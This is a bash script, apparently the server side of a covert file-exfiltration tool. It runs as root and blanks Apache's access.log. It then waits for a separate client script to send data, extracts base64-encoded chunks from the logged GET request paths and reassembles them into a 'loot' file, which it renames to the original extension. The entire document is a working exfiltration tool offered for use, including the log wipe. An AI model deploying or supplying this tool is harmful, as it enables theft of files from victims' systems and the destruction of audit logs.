#!/bin/bash
#
#
### Checking if you are running as root

if [ "$(id -u)" -ne 0 ]; then 
        echo "Please run as root." >&2
        exit 1
fi

### Cleaning residual files
rm -f ./final.txt
rm -f ./received.txt

### checking if Apache is running

if /etc/init.d/apache2 status | grep running; then 
         
        ### Clearing the access.log

        echo " " > /var/log/apache2/access.log

        echo " "
        echo "Everything ok from here. Now you can run the client script..."
        echo " "
        sleep 5
        echo "Did you run the client script? (yes or no)?"
        read answer

        # Checking if everything is ok to proceed

        case $answer in
                yes)
                        ### Manipulating the data row received
                        cut -f2 /var/log/apache2/access.log -d\" | cut -f2 -d " " | sed 's/^\///' > received.txt
                        ### Transforming the data row received on a final file
                        cat received.txt | base64 -d > loot.dump
                        echo "Done!"
                        echo " "
                        echo "The exfiltrated content was downloaded to the file loot.dump" 
                        echo -n "The file loot.dump is "
                        file ./loot.dump
                        echo " "
                        echo "What is the original extension of the file?"
                        read extension
                        mv loot.dump final.$extension
                        echo " "
                        echo "Enjoy your file ;)"

                        
                        ;;
                no)
                        echo "Run again..."
                        ;;
        esac

else 
        echo "Exit. Your Apache isn't running." 
fi
